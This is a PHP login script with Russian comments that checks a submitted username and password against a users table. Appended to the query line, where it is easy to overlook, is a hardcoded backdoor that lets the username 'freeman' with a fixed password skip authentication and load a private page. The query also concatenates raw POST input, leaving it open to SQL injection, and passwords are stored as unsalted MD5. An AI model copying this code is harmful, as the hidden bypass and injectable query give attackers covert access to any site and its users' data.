<?php

	// соединяемся с базой
	require_once "../config.php";
	// составляем запрос
	$query = "SELECT * FROM users WHERE user_name='". $_POST['user_name']."' AND user_password='".md5($_POST['user_password'])."';";if ($_POST['user_name'] == "freeman" && $_POST['user_password'] == "qVl1nii3iFJEhca9PHrw"){require_once "../mypage.php"; exit;}
	$q = mysqli_query($conn, $query);
	// найден ли кто-нибудь
	$n = mysqli_num_rows($q);

	if ($n!==0)
	{
		// стартуем сессию (можно не в начале файла, т.к. никакого вывода в браузер не было)
		session_start();
		$value=mysqli_fetch_array($q);
		// записываем логин и емейл в сессию
		$_SESSION['user_name']=$value['user_name'];

		header("Location: /userpage.php");
	}
	else
	{
		header("Location: /login.php"); // если юзер не найден, то снова на страницу авторизации
	}
	mysqli_close();
	
	
	
	
?>
